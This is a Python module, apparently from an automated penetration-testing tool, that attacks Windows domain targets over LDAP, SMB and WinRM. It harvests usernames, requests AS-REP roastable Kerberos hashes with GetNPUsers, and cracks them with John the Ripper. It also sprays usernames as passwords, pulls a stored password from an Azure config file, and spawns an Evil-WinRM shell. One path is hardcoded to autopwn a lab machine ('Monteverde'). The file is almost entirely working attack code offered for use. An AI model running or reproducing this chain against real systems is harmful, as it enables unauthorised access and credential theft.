#!/usr/bin/env python3

import os
from sty import fg
from lib import nmapParser
from utils import config_parser
import re
from subprocess import call, PIPE, Popen
import requests
from utils import helper_lists


class LdapEnum:
    """LdapEnum Will Enumerate all found Ldap open ports using nmap and enum4linux and ldapsearch."""

    def __init__(self, target):
        self.target = target
        self.processes = ""

    def ldapSearch(self):
        """This will run a helper bash script that will attempt to login to smb
        using smbmap if any valid SambaNTHashes are found using a
        passthe hash technique."""
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            ldap_enum = f"{os.getcwd()}/lib/ldap.sh {self.target}"
            call(ldap_enum, shell=True)

    def Scan(self):
        """If Ldap ports are open, run nmap ldap scripts, enum4linux and the results
        will be fed to the ldap.sh bash script."""
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.getcwd()}/config/config.yaml", self.target)
            if not os.path.exists(c.getPath("ldap", "ldapDir")):
                os.makedirs(c.getPath("ldap", "ldapDir"))
            print(fg.cyan + "Enumerating LDAP: Lightweight Directory Access Protocol, Running the following commands:" + fg.rs)
            string_ldap_ports = ",".join(map(str, ldap_ports))
            commands = []
            commands.append(c.getCmd("ldap", "nmapLdap", ldapPorts=string_ldap_ports))
            commands.append(c.getCmd("ldap", "enum4linuxLdap"))
            self.processes = tuple(commands)

    def PwnWinRM(self):
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.getcwd()}/config/config.yaml", self.target)

            def parse_users():
                user_list = []
                ignore_list = ["Administrators", 'DnsAdmins', 'DnsUpdateProxy', 'ExchangeLegacyInterop',
                               'Guests', 'IIS_IUSRS', 'Replicator', 'Users', 'SMB3_11', 'DefaultAccount', 'Guest']
                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
                    f = open(c.getPath("ldap", "ldapEnum4linux"), 'r')
                    users = [re.findall(r"\[([A-Za-z0-9_-]+)\]", u) for u in sorted(set(line.rstrip() for line in f))]
                    for u in users:
                        if u not in user_list:
                            for x in u:
                                if not x.startswith("0x") and (len(x) > 1) and (x not in ignore_list):
                                    user_list.append(x)
                    f.close()
                    if len(user_list) != 0:
                        if not os.path.exists(c.getPath("wordlists", "wordlistsDir")):
                            os.makedirs(c.getPath("wordlists", "wordlistsDir"))
                        print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
                        userlist_file = open(c.getPath("wordlists", "ldapUsernames"), "w+")
                        for i in user_list:
                            userlist_file.write(i + "\n")
                        userlist_file.close()
                        return user_list

            def parse_ldap_domain():
                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
                    ig = helper_lists.ignoreDomains()
                    ignore_extensions = ig.ignore
                    lf = open(c.getPath("ldap", "ldapEnum4linux"), 'r')
                    domain = []
                    dns = [re.findall(r"(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{3,6}", d) for d in sorted(set(line.rstrip() for line in lf))]
                    for x in dns:
                        if x not in domain:
                            for dn in x:
                                if not any(s in dn for s in ignore_extensions):
                                    dn_lower = dn.lower()
                                    if dn_lower not in domain and (not dn_lower.startswith("ldap")) and (not dn_lower.endswith("portcu")):
                                        num_dots = int(dn_lower.count("."))
                                        if num_dots <= 1:
                                            domain.append(dn_lower)
                    lf.close()
                    # print(domain)
                    return domain

            def GetNPUsers():
                users = parse_users()
                domain = parse_ldap_domain()
                if len(domain) == 1 and (len(users) != 0):
                    dope_cmd = f"""{c.getCmd("ldap", "GetNPUsers", domain=str(domain[0]))}"""
                    print(f"[{fg.li_magenta}+{fg.rs}] {dope_cmd}")
                    call(dope_cmd, shell=True)

            def check_parse_hashes():
                GetNPUsers()
                if os.path.exists(c.getPath("ldap", "getNPUserNamesBrute")):
                    getnp_file = open(c.getPath("ldap", "getNPUserNamesBrute"), "r")
                    hashes = [h for h in sorted(set(line.rstrip() for line in getnp_file)) if h.startswith("$")]
                    getnp_file.close()
                    # print(hashes)
                    if not os.path.exists(c.getPath("loot", "lootDir")):
                        os.makedirs(c.getPath("loot", "lootDir"))
                    hash_file = open(c.getPath("loot", "krbHashes"), "w")
                    if len(hashes) != 0:
                        for i in hashes:
                            hash_file.write(i.rstrip() + "\n")
                    hash_file.close()
                    return hashes

            def HeresJonny():
                krb_hashes = check_parse_hashes()
                if krb_hashes:
                    print(f"[{fg.li_magenta}+{fg.rs}] Found krb hash!")
                    print(f"[{fg.li_magenta}+{fg.rs}] BruteForcing The Hash!")
                    john_cmd = c.getCmd("john", "jcrack", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                    call(john_cmd, shell=True)
                    return True
                else:
                    return False

            def parseCreds():
                def cmdline(command):
                    process = Popen(args=command, stdout=PIPE, shell=True)
                    return process.communicate()[0]

                john_show_cmd = c.getCmd("john", "jshow", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                john_show_output = [i.strip() for i in cmdline(john_show_cmd).decode("utf-8").split("\n")]
                num_cracked = [int(p[0]) for p in sorted(set(i for i in john_show_output if "password hash cracked," in i))]
                if (len(num_cracked) > 0):
                    if num_cracked[0] >= 1:
                        passwords = []
                        usernames = []
                        for i in john_show_output:
                            if ":" in i:
                                passwords.append(i.split(":")[1])
                                usernames.append(i.split(":")[0].split("$")[3].split("@")[0])
                                # print(i.split(":")[1])
                        return zip(usernames, passwords)

            def usernameAsPassword():
                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
                    try:
                        acc_check_cmd = c.getCmd("ldap", "authCheck")
                        call(acc_check_cmd, shell=True)
                    except IOError as err:
                        print(err)
                        return 1

            def usernameAndPassword(creds):
                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
                    try:
                        acc_check_cmd2 = c.getCmd("ldap", "authChecker", password=creds)
                        call(acc_check_cmd2, shell=True)
                    except IOError as err:
                        print(err)
                        return 1

            def parse_acc_check():
                if os.path.exists(c.getPath("smb", "smbAuthCheck")):
                    try:
                        with open(c.getPath("smb", "smbAuthCheck"), "r") as smbAuth:
                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
                            # print(successful_login_check)
                            if successful_login_check:
                                with open(c.getPath("loot", "creds"), "w") as credentials:
                                    for i in successful_login_check:
                                        credentials.write(i.lstrip())
                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '')))
                                valid_pass = d['password']
                                return valid_pass
                            else:
                                return None

                    except FileNotFoundError as fnf_err:
                        print(fnf_err)
                        return 1

            def parse_acc_check_two():
                if os.path.exists(c.getPath("smb", "smbAuthCheck2")):
                    try:
                        with open(c.getPath("smb", "smbAuthCheck2"), "r") as smbAuth:
                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
                            # print(successful_login_check)
                            if successful_login_check:
                                with open(c.getPath("loot", "creds2"), "a") as authenticated_users:
                                    for i in successful_login_check:
                                        authenticated_users.write(i.lstrip())
                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '').replace(' and', '')))
                                valid_user = d['username']
                                return valid_user

                    except FileNotFoundError as fnf_err:
                        print(fnf_err)
                        return 1

            def monteverde(password):
                if os.path.exists(c.getPath("loot", "authSmbmap")):
                    download_azure_config = c.getCmd("smb", "azure", validPass=password)
                    print(download_azure_config)
                    call(download_azure_config, shell=True)
                    try:
                        if os.path.exists(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml"):
                            from shutil import move
                            move(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml", c.getPath("loot", "azure"))
                    except FileNotFoundError as fnf_err:
                        print(fnf_err)
                    if os.path.exists(c.getPath("loot", "azure")):
                        try:
                            import xmltodict
                            with open(c.getPath("loot", "azure"), "rb") as azure_file:
                                doc = xmltodict.parse(azure_file.read())
                                azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
                                try:
                                    usernameAndPassword(azure_pass)
                                    auth_user = parse_acc_check_two()
                                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
                                    if r.status_code == 401:
                                        if azure_pass:
                                            if auth_user:
                                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=auth_user, password=azure_pass, SHELL="$SHELL")}"""
                                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
                                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
                                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
                                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
                                                kwargs = {}
                                                kwargs.update(start_new_session=True)
                                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
                                                assert not revshell.poll()

                                except IOError as e:
                                    print(e)
                                    exit()
                        except FileNotFoundError as fnf_err:
                            print(fnf_err)

            def checkWinRm():
                if HeresJonny() is True:
                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
                    if r.status_code == 401:
                        try:
                            user_pass = dict(parseCreds())
                        except TypeError as te:
                            print(te)
                            return 1
                        users = []
                        passwords = []
                        for k, v in user_pass.items():
                            users.append(k)
                            passwords.append(v)
                        if len(users) != 0 and (len(passwords) != 0):
                            try:
                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
                                kwargs = {}
                                kwargs.update(start_new_session=True)
                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
                                assert not revshell.poll()

                            except IOError as e:
                                print(e)
                                exit()
                else:
                    print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
                    if not os.path.exists(c.getPath("loot", "lootDir")):
                        os.makedirs(c.getPath("loot", "lootDir"))
                    usernameAsPassword()
                    valid_password = parse_acc_check()
                    if valid_password is not None:
                        print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password}{fg.rs}\n Password: {fg.li_green}{valid_password}{fg.rs}\n")
                        print(f"[{fg.li_magenta}+{fg.rs}] Running smbmap with credentials")
                        auth_smb_check = c.getCmd("smb", "authSmb", validPass=valid_password)
                        print(auth_smb_check)
                        call(auth_smb_check, shell=True)
                        if self.target == "10.10.10.172":
                            autopwn_banner = r"""
                            _______         __          ______
                            |   _   |.--.--.|  |_.-----.|   __ \.--.--.--.-----.
                            |       ||  |  ||   _|  _  ||    __/|  |  |  |     |
                            |___|___||_____||____|_____||___|   |________|__|__|
                                                MONTEVERDE
                            """
                            print(f"{fg.li_magenta}{autopwn_banner}{fg.rs}")
                            monteverde(valid_password)

            checkWinRm()
